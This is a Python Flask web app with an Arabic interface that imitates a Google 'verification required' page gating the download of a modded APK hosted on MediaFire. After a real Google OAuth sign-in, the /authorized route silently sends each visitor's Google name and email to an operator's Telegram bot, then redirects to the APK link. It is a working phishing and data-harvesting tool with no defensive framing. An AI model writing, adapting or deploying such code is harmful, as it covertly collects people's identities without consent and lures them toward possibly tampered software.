import os
import requests
from flask import Flask, redirect, render_template_string, request, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "simple_google_login_key_77")

CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "ضع_Client_Id_هنا")
CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "ضع_Client_Secret_هنا")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"


# الصفحة الرئيسية: زر تسجيل الدخول المباشر بحساب Google
@app.route("/")
def index():
  return render_template_string("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول عبر Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #f8f9fa; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .card { background: #fff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); text-align: center; }
        .title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 10px; }
        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 30px; line-height: 22px; }
        .google-btn { display: flex; align-items: center; justify-content: center; width: 100%; background: #ffffff; color: #3c4043; border: 1px solid #dadce0; border-radius: 24px; padding: 12px 16px; font-size: 15px; font-weight: 500; text-decoration: none; cursor: pointer; transition: background 0.2s; }
        .google-btn:hover { background: #f7f8f9; border-color: #d2d5dc; }
        .google-icon { width: 20px; height: 20px; margin-left: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">التحقق المطلوب</div>
        <div class="subtitle">يرجى تسجيل الدخول باستخدام حساب Google المعتمد للمتابعة وتحميل الملف.</div>
        <a href="/google-login" class="google-btn">
            <svg class="google-icon" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.17 21.36 7.23 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 12s.43 3.86 1.18 5.38l4.09-3.14z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.17 2.64 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
            تسجيل الدخول بواسطة Google
        </a>
    </div>
</body>
</html>
""")


# التوجيه لصفحة جوجل
@app.route("/google-login")
def google_redirect():
  redirect_uri = url_for("authorized", _external=True)
  google_auth_url = (
      "https://accounts.google.com/o/oauth2/v2/auth?"
      f"client_id={CLIENT_ID}&"
      f"redirect_uri={redirect_uri}&"
      "response_type=code&"
      "scope=openid%20email%20profile"
  )
  return redirect(google_auth_url)


# استقبال البيانات الحقيقية من جوجل، إرسالها لتليجرام، والتحويل لميديافاير
@app.route("/authorized")
def authorized():
  code = request.args.get("code")
  if not code:
    return redirect(url_for("index"))

  redirect_uri = url_for("authorized", _external=True)

  # تبادل الكود بـ Access Token
  token_url = "https://oauth2.googleapis.com/token"
  data = {
      "code": code,
      "client_id": CLIENT_ID,
      "client_secret": CLIENT_SECRET,
      "redirect_uri": redirect_uri,
      "grant_type": "authorization_code",
  }

  token_res = requests.post(token_url, data=data).json()
  access_token = token_res.get("access_token")

  if access_token:
    # جلب البريد واسم الحساب الحقيقيين من جوجل
    user_info = requests.get(
        "https://www.googleapis.com/oauth2/v1/userinfo",
        headers={"Authorization": f"Bearer {access_token}"},
    ).json()

    user_email = user_info.get("email")
    google_name = user_info.get("name")

    # إرسال البيانات فوراً إلى بوت التليجرام
    if BOT_TOKEN and CHAT_ID and user_email:
      msg = (
          "🤖 تم تسجيل الدخول بحساب Google بنجاح:\n\n📛 اسم الحساب:"
          f" {google_name}\n📧 البريد الإلكتروني الحقيقي: {user_email}"
      )
      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

  return redirect(FINAL_REDIRECT_URL)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
